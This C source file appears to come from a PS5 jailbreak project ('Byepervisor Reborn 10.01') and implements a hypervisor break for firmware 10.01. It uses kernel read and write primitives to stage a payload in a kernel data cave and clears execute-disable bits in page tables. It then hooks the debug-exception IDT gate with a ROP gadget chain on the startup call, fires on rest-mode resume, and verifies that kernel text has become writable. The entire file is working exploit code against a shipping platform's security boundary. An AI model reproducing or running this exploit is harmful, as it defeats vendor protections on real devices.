#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include <ps5/kernel.h>

#include "break_hv_payload_1001/break_hv_1001.h"
#include "fw_1001.h"
#include "fw_1001_textmap.h"
#include "kdlsym.h"
#include "khook.h"
#include "paging.h"
#include "util.h"

#define HOOK_CORE                 0
#define HOOK_IST                  6
#define TSS_STRIDE                0x68
#define STARTUP_MP_PAYLOAD_PAGE   0x3ffff000ULL

#define CAVE_ORACLE_OFF           KH_OFF_USER
#define CAVE_STATE_OFF            0x600
#define CAVE_SAVE_OFF             0x620
#define CAVE_CARRIER_SOURCE_OFF   0x1000
#define CAVE_RESULT_OFF           0x2000
#define CAVE_RESULT_SIZE          0x500

#define PARAM_STOCK_RIP_OFF       0xf00
#define PARAM_DMAP_OFF            0xf08
#define PARAM_RESULT_OFF          0xf10
#define PARAM_NEEDLE_RIP_OFF      0xf18
#define PARAM_NEEDLE_CR3_OFF      0xf20
#define PARAM_EXEC_MARKER_OFF     0xf28
#define PARAM_ORIGINAL_RSP_OFF    0xf30

#define STATE_ARMED               0x4b484f4f4b454401ULL
#define HOOK_MARKER               0x31303031484f4f4bULL
#define AP_EXEC_MARKER            0x4d505841ULL
#define STRIKE_COMPLETE           0x4856533100000002ULL
#define STRIKE_REJECTED           0x4856533100000003ULL

#define PAGE_TABLE_ADDR_MASK      0x000ffffffffff000ULL
#define VMCB_SCAN_LO              0x62a00000ULL
#define VMCB_SCAN_HI              0x63800000ULL
#define VMCB_IOPM_BASE_PA         0x40
#define VMCB_ASID                 0x58
#define VMCB_NESTED_CTRL          0x90
#define VMCB_NESTED_CR3           0xb0
#define VMCB_CONTROL2             0xb8

typedef struct {
  uint64_t address[4];
  uint64_t original[4];
  size_t count;
} carrier_exec_patch_t;

static uint64_t kernel_read64(uint64_t address, void *opaque)
{
  (void)opaque;
  return kread64(address);
}

static void kernel_write64(uint64_t address, uint64_t value, void *opaque)
{
  (void)opaque;
  kwrite64(address, value);
}

static int record_exec_entry(carrier_exec_patch_t *patch, uint64_t address,
                             uint64_t value)
{
  if (address == UINT64_MAX || !PDE_FIELD(value, PRESENT) ||
      patch->count >= 4)
    return -1;
  patch->address[patch->count] = address;
  patch->original[patch->count++] = value;
  return 0;
}

static int plan_carrier_execute(carrier_exec_patch_t *patch,
                                uint64_t pmap, uint64_t carrier)
{
  uint64_t address;
  uint64_t entry;
  int ret;

  patch->count = 0;
  address = find_pml4e(pmap, carrier, &entry);
  if ((ret = record_exec_entry(patch, address, entry)) != 0)
    return ret;
  address = find_pdpe(pmap, carrier, &entry);
  if ((ret = record_exec_entry(patch, address, entry)) != 0)
    return ret;
  if (PDE_FIELD(entry, PS))
    return 0;
  address = find_pde(pmap, carrier, &entry);
  if ((ret = record_exec_entry(patch, address, entry)) != 0)
    return ret;
  if (PDE_FIELD(entry, PS))
    return 0;
  address = find_pte(pmap, carrier, &entry);
  return record_exec_entry(patch, address, entry);
}

static int apply_carrier_execute(const carrier_exec_patch_t *patch)
{
  if (!patch || patch->count < 2 || patch->count > 4)
    return -1;
  for (size_t i = 0; i < patch->count; ++i)
    if (kread64(patch->address[i]) != patch->original[i])
      return -2;
  for (size_t i = 0; i < patch->count; ++i) {
    uint64_t executable = patch->original[i];
    CLEAR_PDE_BIT(executable, EXECUTE_DISABLE);
    kwrite64(patch->address[i], executable);
    if (kread64(patch->address[i]) != executable)
      return -3;
  }
  return 0;
}

static int restore_carrier_execute(carrier_exec_patch_t *patch)
{
  int error = 0;

  for (size_t i = patch->count; i != 0; --i) {
    size_t n = i - 1;
    kwrite64(patch->address[n], patch->original[n]);
    if (kread64(patch->address[n]) != patch->original[n])
      error = -1;
  }
  if (!error)
    patch->count = 0;
  return error;
}

static int stage_carrier(uint64_t cave)
{
  unsigned char actual[0xe00];

  if (break_hv_1001_len == 0 || break_hv_1001_len > sizeof(actual) ||
      CAVE_CARRIER_SOURCE_OFF + break_hv_1001_len > CAVE_RESULT_OFF)
    return -1;
  if (kwrite(cave + CAVE_CARRIER_SOURCE_OFF, break_hv_1001,
             break_hv_1001_len) != 0 ||
      kread(cave + CAVE_CARRIER_SOURCE_OFF, actual,
            break_hv_1001_len) != 0)
    return -2;
  return memcmp(actual, break_hv_1001, break_hv_1001_len) == 0 ? 0 : -3;
}

static void capture_call_args(kh_chain_t *chain, uint64_t oracle)
{
  kh_chain_g(chain, KERNEL_GADGET_MOV_RAX_RDI);
  kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(chain, oracle + 0x08);
  kh_chain_g(chain, KERNEL_GADGET_ST_RCX_RAX);

  kh_chain_g(chain, KERNEL_GADGET_MOV_RAX_RSI);
  kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(chain, oracle + 0x10);
  kh_chain_g(chain, KERNEL_GADGET_ST_RCX_RAX);

  kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(chain, oracle + 0x18);
  kh_chain_g(chain, KERNEL_GADGET_ST_RCX_RDX);
}

static void chain_store(kh_chain_t *chain, uint64_t address, uint64_t value)
{
  kh_chain_g(chain, KERNEL_GADGET_POP_RAX);
  kh_chain_q(chain, value);
  kh_chain_g(chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(chain, address);
  kh_chain_g(chain, KERNEL_GADGET_ST_RCX_RAX);
}

static int install_hook(khook_t *hook, uint64_t cave, uint64_t carrier,
                        uint64_t kernel_cr3)
{
  kh_chain_t chain;
  uint8_t chain_buf[0x400];
  uint64_t oracle = cave + CAVE_ORACLE_OFF;
  int ret;

  ret = kh_init(hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret)
    return ret;
  hook->tss_stride = TSS_STRIDE;
  kh_set_tables(hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(hook, HOOK_CORE);
  hook->oneshot = 1;
  kh_set_hook_target(hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  kh_set_resume_rsi(hook, carrier);
  kh_set_resume_rdx(hook, kernel_cr3);

  kh_chain_init(&chain, chain_buf, sizeof(chain_buf));
  chain_store(&chain, oracle, HOOK_MARKER);
  capture_call_args(&chain, oracle);

  /* RSI is the live stock continuation. Capture it before REP MOVSB. */
  kh_chain_g(&chain, KERNEL_GADGET_MOV_RAX_RSI);
  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(&chain, carrier + PARAM_STOCK_RIP_OFF);
  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RAX);
  kh_chain_memcpy(&chain, carrier, cave + CAVE_CARRIER_SOURCE_OFF,
                  break_hv_1001_len);

  chain_store(&chain, carrier + PARAM_DMAP_OFF, kdldmap(0));
  chain_store(&chain, carrier + PARAM_RESULT_OFF, cave + CAVE_RESULT_OFF);
  chain_store(&chain, carrier + PARAM_NEEDLE_RIP_OFF, carrier);
  chain_store(&chain, carrier + PARAM_NEEDLE_CR3_OFF, kernel_cr3);
  chain_store(&chain, carrier + PARAM_EXEC_MARKER_OFF, 0);
  chain_store(&chain, carrier + PARAM_ORIGINAL_RSP_OFF, 0);
  chain_store(&chain, cave + CAVE_RESULT_OFF, 0);
  if (chain.err)
    return -10;

  ret = kh_install(hook, &chain);
  if (ret)
    return ret;
  kh_trigger(hook);

  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook->saved_gate_lo);
  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook->saved_gate_hi);
  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook->saved_ist);
  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
  return kread64(cave + CAVE_STATE_OFF) == STATE_ARMED ? 0 : -11;
}

static int restore_hook(khook_t *hook)
{
  uint64_t gate;
  uint64_t ist;
  int ret = 0;

  /*
   * A zero saved IST is valid.  In particular, IST6 is unused on the stock
   * 10.01 kernel and has repeatedly been observed as zero on hardware.  The
   * saved gate and IST values are data to restore, not validity sentinels.
   */
  if (!hook || !hook->idt_base || !hook->tss_base)
    return -1;
  gate = hook->idt_base + 16 * KH_VEC_DB;
  ist = hook->tss_base + (uint64_t)HOOK_CORE * hook->tss_stride +
        KH_TSS_IST(HOOK_IST);
  if (hook->installed && kh_disarm(hook) != 0)
    ret = -2;
  if (hook->installed) {
    if (kh_restore(hook) != 0)
      ret = -3;
  } else {
    kwrite64(gate + 8, hook->saved_gate_hi);
    kwrite64(gate, hook->saved_gate_lo);
    kwrite64(ist, hook->saved_ist);
  }
  if (kread64(gate) != hook->saved_gate_lo ||
      kread64(gate + 8) != hook->saved_gate_hi ||
      kread64(ist) != hook->saved_ist)
    ret = -4;
  return ret;
}

static int scan_pa_contains(uint64_t pa)
{
  return pa >= VMCB_SCAN_LO && pa <= VMCB_SCAN_HI - 0x1000 &&
         (pa & 0xfff) == 0;
}

static int validate_strike(uint64_t result, uint64_t dmap,
                           uint64_t carrier, uint64_t kernel_cr3)
{
  uint64_t self_pa = kread64(result + 3 * 8);
  uint64_t self_asid = kread64(result + 4 * 8);
  uint64_t self_seen = 0;

  if (kread64(result + 0 * 8) != STRIKE_COMPLETE ||
      kread64(result + 1 * 8) != 0 ||
      kread64(result + 2 * 8) != 1 ||
      kread64(result + 6 * 8) != 16 ||
      kread64(result + 7 * 8) != kread64(result + 5 * 8) ||
      kread64(result + 8 * 8) != 0 ||
      kread64(result + 9 * 8) != carrier ||
      kread64(result + 10 * 8) != kernel_cr3 ||
      kread64(result + 11 * 8) != 1 ||
      kread64(result + 12 * 8) != 1 ||
      kread64(result + 13 * 8) != 16 ||
      kread64(result + 14 * 8) != 16 ||
      self_asid == 0 || self_asid > 16)
    return -1;

  for (uint64_t i = 0; i < 16; ++i) {
    uint64_t detail = result + (64 + i * 5) * 8;
    uint64_t pa = kread64(detail);
    uint64_t vmcb = dmap + pa;

    for (uint64_t j = 0; j < i; ++j)
      if (kread64(result + (64 + j * 5) * 8) == pa)
        return -2;
    if (!scan_pa_contains(pa) || kread64(detail + 8) != 9 ||
        kread64(detail + 16) != 8 || kread64(detail + 32) != 0 ||
        kread64(vmcb + VMCB_NESTED_CTRL) != 8 ||
        kread32(vmcb + VMCB_ASID) != self_asid ||
        kread64(vmcb + VMCB_CONTROL2) != 1 ||
        !scan_pa_contains(kread64(vmcb + VMCB_NESTED_CR3)) ||
        !scan_pa_contains(kread64(vmcb + VMCB_IOPM_BASE_PA)))
      return -3;
    if (pa == self_pa)
      self_seen++;
  }
  return self_seen == 1 ? 0 : -4;
}

int run_fw_1001(void)
{
  unsigned char zero[CAVE_RESULT_SIZE] = {0};
  unsigned char text_before[8];
  unsigned char text_after[8];
  fw_1001_textmap_plan_t text_plan;
  carrier_exec_patch_t exec_patch = {0};
  khook_t hook = {0};
  uint64_t cave = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t carrier = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t dmap = kdldmap(0);
  uint64_t pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
  uint64_t pml4;
  uint64_t kernel_cr3;
  uint64_t status = 0;
  unsigned post_hook_seconds = 0;
  int text_live = 0;
  int exec_planned = 0;
  int hook_started = 0;
  int ret = -1;

  printf("[1001] guarded 10.01 S3 path\n");
  if (!cave || !carrier || !dmap || !pmap || pin_to_core(HOOK_CORE) != 0)
    goto fail;
  pml4 = kread64(pmap + KERNEL_OFFSET_PMAP_PM_PML4);
  kernel_cr3 = kread64(pmap + 0x28);
  if (!pml4 || !kernel_cr3 || (kernel_cr3 & 0xfff) ||
      pml4 != dmap + (kernel_cr3 & PAGE_TABLE_ADDR_MASK)) {
    ret = -2;
    goto fail;
  }

  ret = fw_1001_textmap_build(&text_plan, pml4, dmap, ktext(0),
                               ktext(FW_1001_TEXT_SIZE), kernel_read64, 0);
  if (ret != 0)
    goto fail;
  ret = fw_1001_textmap_apply(&text_plan, kernel_read64, kernel_write64, 0);
  if (ret != 0)
    goto fail;
  text_live = 1;

  ret = stage_carrier(cave);
  if (ret != 0)
    goto fail;
  if (kwrite(cave + CAVE_RESULT_OFF, zero, sizeof(zero)) != 0) {
    ret = -3;
    goto fail;
  }
  kwrite64(cave + CAVE_ORACLE_OFF, 0);
  kwrite64(cave + CAVE_STATE_OFF, 0);

  ret = plan_carrier_execute(&exec_patch, pmap, carrier);
  if (ret != 0)
    goto fail;
  exec_planned = 1;
  ret = apply_carrier_execute(&exec_patch);
  if (ret != 0)
    goto fail;

  hook_started = 1;
  ret = install_hook(&hook, cave, carrier, kernel_cr3);
  if (ret != 0)
    goto fail;

  printf("[1001] armed; enter rest mode and resume\n");
  notifyf("Byepervisor Reborn 10.01\nEnter rest mode and resume\n");
  for (;;) {
    sceKernelSleep(1);
    pin_to_core(HOOK_CORE);
    status = kread64(cave + CAVE_RESULT_OFF);
    if (status == STRIKE_COMPLETE || status == STRIKE_REJECTED)
      break;
    if (kread64(cave + CAVE_ORACLE_OFF) == HOOK_MARKER &&
        ++post_hook_seconds >= 30) {
      ret = -4;
      goto fail;
    }
  }

  if (restore_hook(&hook) != 0) {
    ret = -5;
    goto fail;
  }
  hook_started = 0;
  kwrite64(cave + CAVE_STATE_OFF, 0);
  if (kread64(cave + CAVE_STATE_OFF) != 0) {
    ret = -6;
    goto fail;
  }
  if (restore_carrier_execute(&exec_patch) != 0) {
    ret = -7;
    goto fail;
  }
  exec_planned = 0;

  if (status != STRIKE_COMPLETE ||
      kread64(cave + CAVE_ORACLE_OFF) != HOOK_MARKER ||
      kread64(carrier + PARAM_STOCK_RIP_OFF) !=
          kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR) ||
      kread64(carrier + PARAM_EXEC_MARKER_OFF) != AP_EXEC_MARKER ||
      kread64(carrier + PARAM_ORIGINAL_RSP_OFF) == 0 ||
      validate_strike(cave + CAVE_RESULT_OFF, dmap, carrier,
                      kernel_cr3) != 0 ||
      fw_1001_textmap_verify_updated(&text_plan, kernel_read64, 0) !=
          text_plan.count) {
    ret = -8;
    goto fail;
  }

  /* A same-value write proves the final kernel text mapping is writable. */
  if (kread(ktext(0), text_before, sizeof(text_before)) != 0 ||
      kwrite(ktext(0), text_before, sizeof(text_before)) != 0 ||
      kread(ktext(0), text_after, sizeof(text_after)) != 0 ||
      memcmp(text_before, text_after, sizeof(text_before)) != 0) {
    ret = -9;
    goto fail;
  }

  printf("[1001] success: 16 VMCBs and %lu text leaves verified\n",
         text_plan.count);
  notifyf("Byepervisor Reborn 10.01\n"
          "Success - kernel text: %02x %02x %02x %02x %02x %02x %02x %02x",
          text_after[0], text_after[1], text_after[2], text_after[3],
          text_after[4], text_after[5], text_after[6], text_after[7]);
  return 0;

fail:
  if (hook_started && hook.saved_gate_lo && restore_hook(&hook) != 0) {
    notifyf("[ERROR] Byepervisor Reborn 10.01\n"
            "Hook cleanup failed; reboot required\n");
    return -10;
  }
  if (cave) {
    kwrite64(cave + CAVE_STATE_OFF, 0);
    if (kread64(cave + CAVE_STATE_OFF) != 0)
      ret = -10;
  }
  if (exec_planned && restore_carrier_execute(&exec_patch) != 0)
    ret = -11;
  if (text_live &&
      fw_1001_textmap_restore_guarded(&text_plan, kernel_read64,
                                       kernel_write64, 0) != text_plan.count) {
    notifyf("[ERROR] Byepervisor Reborn 10.01\n"
            "Cleanup verification failed; reboot required\n");
    return -12;
  }
  printf("[1001] rejected: %d\n", ret);
  notifyf("[ERROR] Byepervisor Reborn 10.01\nRejected (%d)\n", ret);
  return ret;
}
